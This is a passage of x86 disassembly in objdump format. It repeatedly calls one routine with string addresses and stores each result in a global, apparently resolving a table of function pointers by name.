  4017c4:	8b ce                	mov    %esi,%ecx
  4017c6:	a3 00 22 44 00       	mov    %eax,0x442200
  4017cb:	e8 cf fa ff ff       	call   0x40129f
  4017d0:	68 d4 65 43 00       	push   $0x4365d4
  4017d5:	8b ce                	mov    %esi,%ecx
  4017d7:	a3 0c 21 44 00       	mov    %eax,0x44210c
  4017dc:	e8 be fa ff ff       	call   0x40129f
  4017e1:	68 c0 65 43 00       	push   $0x4365c0
  4017e6:	8b ce                	mov    %esi,%ecx
  4017e8:	a3 18 21 44 00       	mov    %eax,0x442118
  4017ed:	e8 ad fa ff ff       	call   0x40129f
  4017f2:	68 b0 65 43 00       	push   $0x4365b0
  4017f7:	8b ce                	mov    %esi,%ecx
  4017f9:	a3 08 1e 44 00       	mov    %eax,0x441e08
  4017fe:	e8 9c fa ff ff       	call   0x40129f
  401803:	68 9c 65 43 00       	push   $0x43659c
  401808:	8b ce                	mov    %esi,%ecx
  40180a:	a3 bc 1e 44 00       	mov    %eax,0x441ebc
  40180f:	e8 8b fa ff ff       	call   0x40129f
  401814:	68 88 65 43 00       	push   $0x436588
  401819:	8b ce                	mov    %esi,%ecx
  40181b:	a3 2c 21 44 00       	mov    %eax,0x44212c
  401820:	e8 7a fa ff ff       	call   0x40129f
  401825:	68 64 65 43 00       	push   $0x436564
  40182a:	8b ce                	mov    %esi,%ecx
  40182c:	a3 64 1c 44 00       	mov    %eax,0x441c64
  401831:	e8 69 fa ff ff       	call   0x40129f
  401836:	68 4c 65 43 00       	push   $0x43654c
  40183b:	8b ce                	mov    %esi,%ecx
  40183d:	a3 70 20 44 00       	mov    %eax,0x442070
  401842:	e8 58 fa ff ff       	call   0x40129f
  401847:	68 38 65 43 00       	push   $0x436538
  40184c:	8b ce                	mov    %esi,%ecx
  40184e:	a3 c8 1d 44 00       	mov    %eax,0x441dc8
  401853:	e8 47 fa ff ff       	call   0x40129f
  401858:	68 20 65 43 00       	push   $0x436520
  40185d:	8b ce                	mov    %esi,%ecx
  40185f:	a3 a4 1f 44 00       	mov    %eax,0x441fa4
  401864:	e8 36 fa ff ff       	call   0x40129f
  401869:	68 04 65 43 00       	push   $0x436504
  40186e:	8b ce                	mov    %esi,%ecx
  401870:	a3 2c 1f 44 00       	mov    %eax,0x441f2c
  401875:	e8 25 fa ff ff       	call   0x40129f
  40187a:	68 ec 64 43 00       	push   $0x4364ec
  40187f:	8b ce                	mov    %esi,%ecx
  401881:	a3 bc 22 44 00       	mov    %eax,0x4422bc
  401886:	e8 14 fa ff ff       	call   0x40129f
  40188b:	68 e0 64 43 00       	push   $0x4364e0
  401890:	8b ce                	mov    %esi,%ecx
  401892:	a3 50 20 44 00       	mov    %eax,0x442050
  401897:	e8 03 fa ff ff       	call   0x40129f
  40189c:	a3 d4 20 44 00       	mov    %eax,0x4420d4
  4018a1:	68 d0 64 43 00       	push   $0x4364d0
  4018a6:	8b ce                	mov    %esi,%ecx
  4018a8:	e8 f2 f9 ff ff       	call   0x40129f
  4018ad:	68 c0 64 43 00       	push   $0x4364c0
  4018b2:	8b ce                	mov    %esi,%ecx
  4018b4:	a3 5c 1e 44 00       	mov    %eax,0x441e5c
  4018b9:	e8 e1 f9 ff ff       	call   0x40129f
  4018be:	68 ac 64 43 00       	push   $0x4364ac
  4018c3:	8b ce                	mov    %esi,%ecx
  4018c5:	a3 28 1f 44 00       	mov    %eax,0x441f28
  4018ca:	e8 d0 f9 ff ff       	call   0x40129f
  4018cf:	68 9c 64 43 00       	push   $0x43649c
  4018d4:	8b ce                	mov    %esi,%ecx
  4018d6:	a3 60 1c 44 00       	mov    %eax,0x441c60
  4018db:	e8 bf f9 ff ff       	call   0x40129f
  4018e0:	68 88 64 43 00       	push   $0x436488
  4018e5:	8b ce                	mov    %esi,%ecx
  4018e7:	a3 44 1b 44 00       	mov    %eax,0x441b44
  4018ec:	e8 ae f9 ff ff       	call   0x40129f
  4018f1:	68 74 64 43 00       	push   $0x436474
  4018f6:	8b ce                	mov    %esi,%ecx
  4018f8:	a3 cc 1c 44 00       	mov    %eax,0x441ccc
  4018fd:	e8 9d f9 ff ff       	call   0x40129f
  401902:	68 60 64 43 00       	push   $0x436460
  401907:	8b ce                	mov    %esi,%ecx
  401909:	a3 28 21 44 00       	mov    %eax,0x442128
  40190e:	e8 8c f9 ff ff       	call   0x40129f
  401913:	bf 50 64 43 00       	mov    $0x436450,%edi
  401918:	57                   	push   %edi
  401919:	8b ce                	mov    %esi,%ecx
  40191b:	a3 98 1d 44 00       	mov    %eax,0x441d98
  401920:	e8 7a f9 ff ff       	call   0x40129f
  401925:	68 40 64 43 00       	push   $0x436440
  40192a:	8b ce                	mov    %esi,%ecx
  40192c:	a3 20 1b 44 00       	mov    %eax,0x441b20
  401931:	e8 69 f9 ff ff       	call   0x40129f
  401936:	68 2c 64 43 00       	push   $0x43642c
  40193b:	8b ce                	mov    %esi,%ecx
  40193d:	a3 b0 1b 44 00       	mov    %eax,0x441bb0
  401942:	e8 58 f9 ff ff       	call   0x40129f
  401947:	68 14 64 43 00       	push   $0x436414
  40194c:	8b ce                	mov    %esi,%ecx
  40194e:	a3 18 23 44 00       	mov    %eax,0x442318
  401953:	e8 47 f9 ff ff       	call   0x40129f
  401958:	68 fc 63 43 00       	push   $0x4363fc
  40195d:	8b ce                	mov    %esi,%ecx
  40195f:	a3 44 1c 44 00       	mov    %eax,0x441c44
  401964:	e8 36 f9 ff ff       	call   0x40129f
  401969:	68 e0 63 43 00       	push   $0x4363e0
  40196e:	8b ce                	mov    %esi,%ecx
  401970:	a3 90 1e 44 00       	mov    %eax,0x441e90
  401975:	e8 25 f9 ff ff       	call   0x40129f
  40197a:	68 c4 63 43 00       	push   $0x4363c4
  40197f:	8b ce                	mov    %esi,%ecx
  401981:	a3 cc 20 44 00       	mov    %eax,0x4420cc
  401986:	e8 14 f9 ff ff       	call   0x40129f
  40198b:	68 b8 63 43 00       	push   $0x4363b8
  401990:	8b ce                	mov    %esi,%ecx
  401992:	a3 c8 20 44 00       	mov    %eax,0x4420c8
  401997:	e8 03 f9 ff ff       	call   0x40129f
  40199c:	68 60 63 43 00       	push   $0x436360
  4019a1:	8b ce                	mov    %esi,%ecx
  4019a3:	a3 44 22 44 00       	mov    %eax,0x442244
  4019a8:	e8 f2 f8 ff ff       	call   0x40129f
  4019ad:	68 2c 63 43 00       	push   $0x43632c
  4019b2:	8b ce                	mov    %esi,%ecx
  4019b4:	a3 00 1f 44 00       	mov    %eax,0x441f00
  4019b9:	e8 e1 f8 ff ff       	call   0x40129f
  4019be:	68 a8 62 43 00       	push   $0x4362a8
  4019c3:	8b ce                	mov    %esi,%ecx
  4019c5:	a3 10 22 44 00       	mov    %eax,0x442210
  4019ca:	e8 d0 f8 ff ff       	call   0x40129f
  4019cf:	68 68 62 43 00       	push   $0x436268
  4019d4:	8b ce                	mov    %esi,%ecx
  4019d6:	a3 bc 1c 44 00       	mov    %eax,0x441cbc
  4019db:	e8 bf f8 ff ff       	call   0x40129f
  4019e0:	68 48 62 43 00       	push   $0x436248
  4019e5:	8b ce                	mov    %esi,%ecx
  4019e7:	a3 cc 22 44 00       	mov    %eax,0x4422cc
  4019ec:	e8 ae f8 ff ff       	call   0x40129f
  4019f1:	a3 24 1f 44 00       	mov    %eax,0x441f24
  4019f6:	68 a8 61 43 00       	push   $0x4361a8
  4019fb:	8b ce                	mov    %esi,%ecx
  4019fd:	e8 9d f8 ff ff       	call   0x40129f
  401a02:	68 60 61 43 00       	push   $0x436160
  401a07:	8b ce                	mov    %esi,%ecx
  401a09:	a3 00 1e 44 00       	mov    %eax,0x441e00
  401a0e:	e8 8c f8 ff ff       	call   0x40129f
  401a13:	68 54 61 43 00       	push   $0x436154
  401a18:	8b ce                	mov    %esi,%ecx
  401a1a:	a3 58 1c 44 00       	mov    %eax,0x441c58
  401a1f:	e8 7b f8 ff ff       	call   0x40129f
  401a24:	68 48 61 43 00       	push   $0x436148
  401a29:	8b ce                	mov    %esi,%ecx
  401a2b:	a3 ac 1b 44 00       	mov    %eax,0x441bac
  401a30:	e8 6a f8 ff ff       	call   0x40129f
  401a35:	68 3c 61 43 00       	push   $0x43613c
  401a3a:	8b ce                	mov    %esi,%ecx
  401a3c:	a3 74 1e 44 00       	mov    %eax,0x441e74
  401a41:	e8 59 f8 ff ff       	call   0x40129f
  401a46:	68 18 61 43 00       	push   $0x436118
  401a4b:	8b ce                	mov    %esi,%ecx
  401a4d:	a3 f8 1f 44 00       	mov    %eax,0x441ff8
  401a52:	e8 48 f8 ff ff       	call   0x40129f
  401a57:	68 00 61 43 00       	push   $0x436100
  401a5c:	8b ce                	mov    %esi,%ecx
  401a5e:	a3 40 20 44 00       	mov    %eax,0x442040
  401a63:	e8 37 f8 ff ff       	call   0x40129f
  401a68:	68 e8 60 43 00       	push   $0x4360e8
  401a6d:	8b ce                	mov    %esi,%ecx
  401a6f:	a3 7c 22 44 00       	mov    %eax,0x44227c
  401a74:	e8 26 f8 ff ff       	call   0x40129f
  401a79:	68 bc 60 43 00       	push   $0x4360bc
  401a7e:	8b ce                	mov    %esi,%ecx
  401a80:	a3 c8 21 44 00       	mov    %eax,0x4421c8
  401a85:	e8 15 f8 ff ff       	call   0x40129f
  401a8a:	68 ac 60 43 00       	push   $0x4360ac
  401a8f:	8b ce                	mov    %esi,%ecx
  401a91:	a3 e4 1f 44 00       	mov    %eax,0x441fe4
  401a96:	e8 04 f8 ff ff       	call   0x40129f
  401a9b:	68 68 60 43 00       	push   $0x436068
  401aa0:	8b ce                	mov    %esi,%ecx
  401aa2:	a3 88 1f 44 00       	mov    %eax,0x441f88
  401aa7:	e8 f3 f7 ff ff       	call   0x40129f
  401aac:	68 50 60 43 00       	push   $0x436050
  401ab1:	8b ce                	mov    %esi,%ecx
  401ab3:	a3 7c 1c 44 00       	mov    %eax,0x441c7c
  401ab8:	e8 e2 f7 ff ff       	call   0x40129f
  401abd:	68 24 60 43 00       	push   $0x436024
  401ac2:	8b ce                	mov    %esi,%ecx
  401ac4:	a3 18 1f 44 00       	mov    %eax,0x441f18
  401ac9:	e8 d1 f7 ff ff       	call   0x40129f
  401ace:	68 14 60 43 00       	push   $0x436014
  401ad3:	8b ce                	mov    %esi,%ecx
  401ad5:	a3 b4 1e 44 00       	mov    %eax,0x441eb4
  401ada:	e8 c0 f7 ff ff       	call   0x40129f
  401adf:	68 f0 5f 43 00       	push   $0x435ff0
  401ae4:	8b ce                	mov    %esi,%ecx
  401ae6:	a3 d8 1c 44 00       	mov    %eax,0x441cd8
  401aeb:	e8 af f7 ff ff       	call   0x40129f
  401af0:	68 e4 5f 43 00       	push   $0x435fe4
  401af5:	8b ce                	mov    %esi,%ecx
  401af7:	a3 94 21 44 00       	mov    %eax,0x442194
  401afc:	e8 9e f7 ff ff       	call   0x40129f
  401b01:	68 c4 5f 43 00       	push   $0x435fc4
  401b06:	8b ce                	mov    %esi,%ecx
  401b08:	a3 34 20 44 00       	mov    %eax,0x442034
  401b0d:	e8 8d f7 ff ff       	call   0x40129f
  401b12:	68 b8 5f 43 00       	push   $0x435fb8
  401b17:	8b ce                	mov    %esi,%ecx
  401b19:	a3 b8 1c 44 00       	mov    %eax,0x441cb8
  401b1e:	e8 7c f7 ff ff       	call   0x40129f
  401b23:	68 98 5f 43 00       	push   $0x435f98
  401b28:	8b ce                	mov    %esi,%ecx
  401b2a:	a3 1c 1f 44 00       	mov    %eax,0x441f1c
  401b2f:	e8 6b f7 ff ff       	call   0x40129f
  401b34:	68 80 5f 43 00       	push   $0x435f80
  401b39:	8b ce                	mov    %esi,%ecx
  401b3b:	a3 68 1f 44 00       	mov    %eax,0x441f68
  401b40:	e8 5a f7 ff ff       	call   0x40129f
  401b45:	a3 08 22 44 00       	mov    %eax,0x442208
  401b4a:	68 54 5f 43 00       	push   $0x435f54
  401b4f:	8b ce                	mov    %esi,%ecx
  401b51:	e8 49 f7 ff ff       	call   0x40129f
  401b56:	68 34 5f 43 00       	push   $0x435f34
  401b5b:	8b ce                	mov    %esi,%ecx
  401b5d:	a3 40 1b 44 00       	mov    %eax,0x441b40
  401b62:	e8 38 f7 ff ff       	call   0x40129f
  401b67:	68 00 5f 43 00       	push   $0x435f00
  401b6c:	8b ce                	mov    %esi,%ecx
  401b6e:	a3 38 21 44 00       	mov    %eax,0x442138
  401b73:	e8 27 f7 ff ff       	call   0x40129f
  401b78:	68 f0 5e 43 00       	push   $0x435ef0
  401b7d:	8b ce                	mov    %esi,%ecx
  401b7f:	a3 e8 1e 44 00       	mov    %eax,0x441ee8
  401b84:	e8 16 f7 ff ff       	call   0x40129f
  401b89:	68 cc 5e 43 00       	push   $0x435ecc
  401b8e:	8b ce                	mov    %esi,%ecx
  401b90:	a3 44 1f 44 00       	mov    %eax,0x441f44
  401b95:	e8 05 f7 ff ff       	call   0x40129f
  401b9a:	68 c0 5e 43 00       	push   $0x435ec0
  401b9f:	8b ce                	mov    %esi,%ecx
  401ba1:	a3 fc 22 44 00       	mov    %eax,0x4422fc
  401ba6:	e8 f4 f6 ff ff       	call   0x40129f
  401bab:	68 94 5e 43 00       	push   $0x435e94
  401bb0:	8b ce                	mov    %esi,%ecx
  401bb2:	a3 4c 1b 44 00       	mov    %eax,0x441b4c
  401bb7:	e8 e3 f6 ff ff       	call   0x40129f
  401bbc:	68 80 5e 43 00       	push   $0x435e80
  401bc1:	8b ce                	mov    %esi,%ecx
  401bc3:	a3 00 21 44 00       	mov    %eax,0x442100
  401bc8:	e8 d2 f6 ff ff       	call   0x40129f
  401bcd:	68 58 5e 43 00       	push   $0x435e58
  401bd2:	8b ce                	mov    %esi,%ecx
  401bd4:	a3 74 1c 44 00       	mov    %eax,0x441c74
  401bd9:	e8 c1 f6 ff ff       	call   0x40129f
  401bde:	68 40 5e 43 00       	push   $0x435e40
  401be3:	8b ce                	mov    %esi,%ecx
  401be5:	a3 10 1d 44 00       	mov    %eax,0x441d10
  401bea:	e8 b0 f6 ff ff       	call   0x40129f
  401bef:	68 20 5e 43 00       	push   $0x435e20
  401bf4:	8b ce                	mov    %esi,%ecx
  401bf6:	a3 40 22 44 00       	mov    %eax,0x442240
  401bfb:	e8 9f f6 ff ff       	call   0x40129f
  401c00:	68 08 5e 43 00       	push   $0x435e08
  401c05:	8b ce                	mov    %esi,%ecx
  401c07:	a3 64 1b 44 00       	mov    %eax,0x441b64
  401c0c:	e8 8e f6 ff ff       	call   0x40129f
  401c11:	68 e8 5d 43 00       	push   $0x435de8
  401c16:	8b ce                	mov    %esi,%ecx
  401c18:	a3 a4 1b 44 00       	mov    %eax,0x441ba4
  401c1d:	e8 7d f6 ff ff       	call   0x40129f
  401c22:	68 d8 5d 43 00       	push   $0x435dd8
  401c27:	8b ce                	mov    %esi,%ecx
  401c29:	a3 54 1c 44 00       	mov    %eax,0x441c54
  401c2e:	e8 6c f6 ff ff       	call   0x40129f
  401c33:	68 c8 5d 43 00       	push   $0x435dc8
  401c38:	8b ce                	mov    %esi,%ecx
  401c3a:	a3 e4 1e 44 00       	mov    %eax,0x441ee4
  401c3f:	e8 5b f6 ff ff       	call   0x40129f
  401c44:	68 bc 5d 43 00       	push   $0x435dbc
  401c49:	8b ce                	mov    %esi,%ecx
  401c4b:	a3 f8 1c 44 00       	mov    %eax,0x441cf8
  401c50:	e8 4a f6 ff ff       	call   0x40129f
  401c55:	68 94 5d 43 00       	push   $0x435d94
  401c5a:	8b ce                	mov    %esi,%ecx
  401c5c:	a3 d8 1e 44 00       	mov    %eax,0x441ed8
  401c61:	e8 39 f6 ff ff       	call   0x40129f
  401c66:	68 7c 5d 43 00       	push   $0x435d7c
  401c6b:	8b ce                	mov    %esi,%ecx
  401c6d:	a3 94 1f 44 00       	mov    %eax,0x441f94
  401c72:	e8 28 f6 ff ff       	call   0x40129f
  401c77:	68 50 5d 43 00       	push   $0x435d50
  401c7c:	8b ce                	mov    %esi,%ecx
  401c7e:	a3 04 23 44 00       	mov    %eax,0x442304
  401c83:	e8 17 f6 ff ff       	call   0x40129f
  401c88:	68 3c 5d 43 00       	push   $0x435d3c
  401c8d:	8b ce                	mov    %esi,%ecx
  401c8f:	a3 94 20 44 00       	mov    %eax,0x442094
  401c94:	e8 06 f6 ff ff       	call   0x40129f
  401c99:	68 08 5d 43 00       	push   $0x435d08
  401c9e:	8b ce                	mov    %esi,%ecx
  401ca0:	a3 34 1c 44 00       	mov    %eax,0x441c34
  401ca5:	e8 f5 f5 ff ff       	call   0x40129f
  401caa:	68 f8 5c 43 00       	push   $0x435cf8
  401caf:	8b ce                	mov    %esi,%ecx
  401cb1:	a3 b0 20 44 00       	mov    %eax,0x4420b0
  401cb6:	e8 e4 f5 ff ff       	call   0x40129f
  401cbb:	68 c8 5c 43 00       	push   $0x435cc8
  401cc0:	8b ce                	mov    %esi,%ecx
  401cc2:	a3 e0 21 44 00       	mov    %eax,0x4421e0
  401cc7:	e8 d3 f5 ff ff       	call   0x40129f
  401ccc:	68 bc 5c 43 00       	push   $0x435cbc
  401cd1:	8b ce                	mov    %esi,%ecx
  401cd3:	a3 18 1b 44 00       	mov    %eax,0x441b18
  401cd8:	e8 c2 f5 ff ff       	call   0x40129f
  401cdd:	68 8c 5c 43 00       	push   $0x435c8c
  401ce2:	8b ce                	mov    %esi,%ecx
  401ce4:	a3 78 1e 44 00       	mov    %eax,0x441e78
  401ce9:	e8 b1 f5 ff ff       	call   0x40129f
  401cee:	68 7c 5c 43 00       	push   $0x435c7c
  401cf3:	8b ce                	mov    %esi,%ecx
  401cf5:	a3 1c 20 44 00       	mov    %eax,0x44201c
  401cfa:	e8 a0 f5 ff ff       	call   0x40129f
  401cff:	68 48 5c 43 00       	push   $0x435c48
  401d04:	8b ce                	mov    %esi,%ecx
  401d06:	a3 9c 1e 44 00       	mov    %eax,0x441e9c
  401d0b:	e8 8f f5 ff ff       	call   0x40129f
  401d10:	68 34 5c 43 00       	push   $0x435c34
  401d15:	8b ce                	mov    %esi,%ecx
  401d17:	a3 10 1c 44 00       	mov    %eax,0x441c10
  401d1c:	e8 7e f5 ff ff       	call   0x40129f
  401d21:	57                   	push   %edi
  401d22:	8b ce                	mov    %esi,%ecx
  401d24:	a3 c4 1d 44 00       	mov    %eax,0x441dc4
  401d29:	e8 71 f5 ff ff       	call   0x40129f
  401d2e:	68 28 5c 43 00       	push   $0x435c28
  401d33:	8b ce                	mov    %esi,%ecx
  401d35:	a3 58 21 44 00       	mov    %eax,0x442158
  401d3a:	e8 60 f5 ff ff       	call   0x40129f
  401d3f:	68 1c 5c 43 00       	push   $0x435c1c
  401d44:	8b ce                	mov    %esi,%ecx
  401d46:	a3 58 1e 44 00       	mov    %eax,0x441e58
  401d4b:	e8 4f f5 ff ff       	call   0x40129f
  401d50:	68 0c 5c 43 00       	push   $0x435c0c
  401d55:	8b ce                	mov    %esi,%ecx
  401d57:	a3 5c 22 44 00       	mov    %eax,0x44225c
  401d5c:	e8 3e f5 ff ff       	call   0x40129f
  401d61:	68 fc 5b 43 00       	push   $0x435bfc
  401d66:	8b ce                	mov    %esi,%ecx
  401d68:	a3 c4 1b 44 00       	mov    %eax,0x441bc4
  401d6d:	e8 2d f5 ff ff       	call   0x40129f
  401d72:	68 e8 5b 43 00       	push   $0x435be8
  401d77:	8b ce                	mov    %esi,%ecx
  401d79:	a3 fc 21 44 00       	mov    %eax,0x4421fc
  401d7e:	e8 1c f5 ff ff       	call   0x40129f
  401d83:	68 d8 5b 43 00       	push   $0x435bd8
  401d88:	8b ce                	mov    %esi,%ecx
  401d8a:	a3 50 1b 44 00       	mov    %eax,0x441b50
  401d8f:	e8 0b f5 ff ff       	call   0x40129f
  401d94:	68 c4 5b 43 00       	push   $0x435bc4
  401d99:	8b ce                	mov    %esi,%ecx
  401d9b:	a3 04 1d 44 00       	mov    %eax,0x441d04
  401da0:	e8 fa f4 ff ff       	call   0x40129f
  401da5:	68 98 5b 43 00       	push   $0x435b98
  401daa:	8b ce                	mov    %esi,%ecx
  401dac:	a3 f0 1d 44 00       	mov    %eax,0x441df0
  401db1:	e8 e9 f4 ff ff       	call   0x40129f
  401db6:	68 7c 5b 43 00       	push   $0x435b7c
  401dbb:	8b ce                	mov    %esi,%ecx
  401dbd:	a3 a8 1b 44 00       	mov    %eax,0x441ba8
  401dc2:	e8 d8 f4 ff ff       	call   0x40129f
  401dc7:	68 54 5b 43 00       	push   $0x435b54
  401dcc:	8b ce                	mov    %esi,%ecx
  401dce:	a3 4c 22 44 00       	mov    %eax,0x44224c
  401dd3:	e8 c7 f4 ff ff       	call   0x40129f
  401dd8:	68 38 5b 43 00       	push   $0x435b38
  401ddd:	8b ce                	mov    %esi,%ecx
  401ddf:	a3 18 20 44 00       	mov    %eax,0x442018
  401de4:	e8 b6 f4 ff ff       	call   0x40129f
  401de9:	68 10 5b 43 00       	push   $0x435b10
  401dee:	8b ce                	mov    %esi,%ecx
  401df0:	a3 2c 1e 44 00       	mov    %eax,0x441e2c
  401df5:	e8 a5 f4 ff ff       	call   0x40129f
  401dfa:	a3 30 20 44 00       	mov    %eax,0x442030
  401dff:	68 f8 5a 43 00       	push   $0x435af8
  401e04:	8b ce                	mov    %esi,%ecx
  401e06:	e8 94 f4 ff ff       	call   0x40129f
  401e0b:	68 e4 5a 43 00       	push   $0x435ae4
  401e10:	8b ce                	mov    %esi,%ecx
  401e12:	a3 60 1b 44 00       	mov    %eax,0x441b60
  401e17:	e8 83 f4 ff ff       	call   0x40129f
  401e1c:	68 c8 5a 43 00       	push   $0x435ac8
  401e21:	8b ce                	mov    %esi,%ecx
  401e23:	a3 90 1c 44 00       	mov    %eax,0x441c90
  401e28:	e8 72 f4 ff ff       	call   0x40129f
  401e2d:	68 a8 5a 43 00       	push   $0x435aa8
  401e32:	8b ce                	mov    %esi,%ecx
  401e34:	a3 1c 1e 44 00       	mov    %eax,0x441e1c
  401e39:	e8 61 f4 ff ff       	call   0x40129f
  401e3e:	68 84 5a 43 00       	push   $0x435a84
  401e43:	8b ce                	mov    %esi,%ecx
  401e45:	a3 6c 1b 44 00       	mov    %eax,0x441b6c
  401e4a:	e8 50 f4 ff ff       	call   0x40129f
  401e4f:	68 74 5a 43 00       	push   $0x435a74
  401e54:	8b ce                	mov    %esi,%ecx
  401e56:	a3 e8 21 44 00       	mov    %eax,0x4421e8
  401e5b:	e8 3f f4 ff ff       	call   0x40129f
  401e60:	68 60 5a 43 00       	push   $0x435a60
  401e65:	8b ce                	mov    %esi,%ecx
  401e67:	a3 88 1d 44 00       	mov    %eax,0x441d88
  401e6c:	e8 2e f4 ff ff       	call   0x40129f
  401e71:	68 3c 5a 43 00       	push   $0x435a3c
  401e76:	8b ce                	mov    %esi,%ecx
  401e78:	a3 4c 21 44 00       	mov    %eax,0x44214c
  401e7d:	e8 1d f4 ff ff       	call   0x40129f
  401e82:	68 24 5a 43 00       	push   $0x435a24
  401e87:	8b ce                	mov    %esi,%ecx
  401e89:	a3 a0 1c 44 00       	mov    %eax,0x441ca0
  401e8e:	e8 0c f4 ff ff       	call   0x40129f
  401e93:	68 08 5a 43 00       	push   $0x435a08
  401e98:	8b ce                	mov    %esi,%ecx
  401e9a:	a3 d8 1b 44 00       	mov    %eax,0x441bd8
  401e9f:	e8 fb f3 ff ff       	call   0x40129f
  401ea4:	68 f0 59 43 00       	push   $0x4359f0
  401ea9:	8b ce                	mov    %esi,%ecx
  401eab:	a3 f4 22 44 00       	mov    %eax,0x4422f4
  401eb0:	e8 ea f3 ff ff       	call   0x40129f
  401eb5:	68 d8 59 43 00       	push   $0x4359d8
  401eba:	8b ce                	mov    %esi,%ecx
  401ebc:	a3 28 1e 44 00       	mov    %eax,0x441e28
  401ec1:	e8 d9 f3 ff ff       	call   0x40129f
  401ec6:	68 bc 59 43 00       	push   $0x4359bc
  401ecb:	8b ce                	mov    %esi,%ecx
  401ecd:	a3 e4 21 44 00       	mov    %eax,0x4421e4
  401ed2:	e8 c8 f3 ff ff       	call   0x40129f
  401ed7:	68 a8 59 43 00       	push   $0x4359a8
  401edc:	8b ce                	mov    %esi,%ecx
  401ede:	a3 48 20 44 00       	mov    %eax,0x442048
  401ee3:	e8 b7 f3 ff ff       	call   0x40129f
  401ee8:	68 90 59 43 00       	push   $0x435990
  401eed:	8b ce                	mov    %esi,%ecx
  401eef:	a3 50 1c 44 00       	mov    %eax,0x441c50
  401ef4:	e8 a6 f3 ff ff       	call   0x40129f
  401ef9:	68 7c 59 43 00       	push   $0x43597c
  401efe:	8b ce                	mov    %esi,%ecx
  401f00:	a3 88 22 44 00       	mov    %eax,0x442288
  401f05:	e8 95 f3 ff ff       	call   0x40129f
  401f0a:	68 64 59 43 00       	push   $0x435964
  401f0f:	8b ce                	mov    %esi,%ecx
  401f11:	a3 10 1e 44 00       	mov    %eax,0x441e10
  401f16:	e8 84 f3 ff ff       	call   0x40129f
  401f1b:	68 50 59 43 00       	push   $0x435950
  401f20:	8b ce                	mov    %esi,%ecx
  401f22:	a3 f4 1c 44 00       	mov    %eax,0x441cf4
  401f27:	e8 73 f3 ff ff       	call   0x40129f
  401f2c:	68 30 59 43 00       	push   $0x435930
  401f31:	8b ce                	mov    %esi,%ecx
  401f33:	a3 e8 20 44 00       	mov    %eax,0x4420e8
  401f38:	e8 62 f3 ff ff       	call   0x40129f
  401f3d:	68 1c 59 43 00       	push   $0x43591c
  401f42:	8b ce                	mov    %esi,%ecx
  401f44:	a3 58 22 44 00       	mov    %eax,0x442258
  401f49:	e8 51 f3 ff ff       	call   0x40129f
  401f4e:	a3 b8 1d 44 00       	mov    %eax,0x441db8
  401f53:	68 fc 58 43 00       	push   $0x4358fc
  401f58:	8b ce                	mov    %esi,%ecx
  401f5a:	e8 40 f3 ff ff       	call   0x40129f
  401f5f:	68 e0 58 43 00       	push   $0x4358e0
  401f64:	8b ce                	mov    %esi,%ecx
  401f66:	a3 28 1d 44 00       	mov    %eax,0x441d28
  401f6b:	e8 2f f3 ff ff       	call   0x40129f
  401f70:	68 c4 58 43 00       	push   $0x4358c4
  401f75:	8b ce                	mov    %esi,%ecx
  401f77:	a3 84 20 44 00       	mov    %eax,0x442084
  401f7c:	e8 1e f3 ff ff       	call   0x40129f
  401f81:	68 a8 58 43 00       	push   $0x4358a8
  401f86:	8b ce                	mov    %esi,%ecx
  401f88:	a3 6c 20 44 00       	mov    %eax,0x44206c
  401f8d:	e8 0d f3 ff ff       	call   0x40129f
  401f92:	68 8c 58 43 00       	push   $0x43588c
  401f97:	8b ce                	mov    %esi,%ecx
  401f99:	a3 3c 20 44 00       	mov    %eax,0x44203c
  401f9e:	e8 fc f2 ff ff       	call   0x40129f
  401fa3:	68 74 58 43 00       	push   $0x435874
  401fa8:	8b ce                	mov    %esi,%ecx
  401faa:	a3 38 1d 44 00       	mov    %eax,0x441d38
  401faf:	e8 eb f2 ff ff       	call   0x40129f
  401fb4:	68 50 58 43 00       	push   $0x435850
  401fb9:	8b ce                	mov    %esi,%ecx
  401fbb:	a3 84 1f 44 00       	mov    %eax,0x441f84
  401fc0:	e8 da f2 ff ff       	call   0x40129f
  401fc5:	68 38 58 43 00       	push   $0x435838
  401fca:	8b ce                	mov    %esi,%ecx
  401fcc:	a3 38 22 44 00       	mov    %eax,0x442238
  401fd1:	e8 c9 f2 ff ff       	call   0x40129f
  401fd6:	68 14 58 43 00       	push   $0x435814
  401fdb:	8b ce                	mov    %esi,%ecx
  401fdd:	a3 b8 1e 44 00       	mov    %eax,0x441eb8
  401fe2:	e8 b8 f2 ff ff       	call   0x40129f
  401fe7:	68 f8 57 43 00       	push   $0x4357f8
  401fec:	8b ce                	mov    %esi,%ecx
  401fee:	a3 c4 22 44 00       	mov    %eax,0x4422c4
  401ff3:	e8 a7 f2 ff ff       	call   0x40129f
  401ff8:	68 dc 57 43 00       	push   $0x4357dc
  401ffd:	8b ce                	mov    %esi,%ecx
  401fff:	a3 50 1d 44 00       	mov    %eax,0x441d50
  402004:	e8 96 f2 ff ff       	call   0x40129f
  402009:	68 bc 57 43 00       	push   $0x4357bc
  40200e:	8b ce                	mov    %esi,%ecx
  402010:	a3 58 1f 44 00       	mov    %eax,0x441f58
  402015:	e8 85 f2 ff ff       	call   0x40129f
  40201a:	68 98 57 43 00       	push   $0x435798
  40201f:	8b ce                	mov    %esi,%ecx
  402021:	a3 a8 22 44 00       	mov    %eax,0x4422a8
  402026:	e8 74 f2 ff ff       	call   0x40129f
  40202b:	68 84 57 43 00       	push   $0x435784
  402030:	8b ce                	mov    %esi,%ecx
  402032:	a3 4c 1d 44 00       	mov    %eax,0x441d4c
  402037:	e8 63 f2 ff ff       	call   0x40129f
  40203c:	68 78 57 43 00       	push   $0x435778
  402041:	8b ce                	mov    %esi,%ecx
  402043:	a3 44 21 44 00       	mov    %eax,0x442144
  402048:	e8 52 f2 ff ff       	call   0x40129f
  40204d:	68 64 57 43 00       	push   $0x435764
  402052:	8b ce                	mov    %esi,%ecx
  402054:	a3 90 1d 44 00       	mov    %eax,0x441d90
  402059:	e8 41 f2 ff ff       	call   0x40129f
  40205e:	68 54 57 43 00       	push   $0x435754
  402063:	8b ce                	mov    %esi,%ecx
  402065:	a3 08 21 44 00       	mov    %eax,0x442108
  40206a:	e8 30 f2 ff ff       	call   0x40129f
  40206f:	68 3c 57 43 00       	push   $0x43573c
  402074:	8b ce                	mov    %esi,%ecx
  402076:	a3 b8 1f 44 00       	mov    %eax,0x441fb8
  40207b:	e8 1f f2 ff ff       	call   0x40129f
  402080:	68 20 57 43 00       	push   $0x435720
  402085:	8b ce                	mov    %esi,%ecx
  402087:	a3 78 1c 44 00       	mov    %eax,0x441c78
  40208c:	e8 0e f2 ff ff       	call   0x40129f
  402091:	68 04 57 43 00       	push   $0x435704
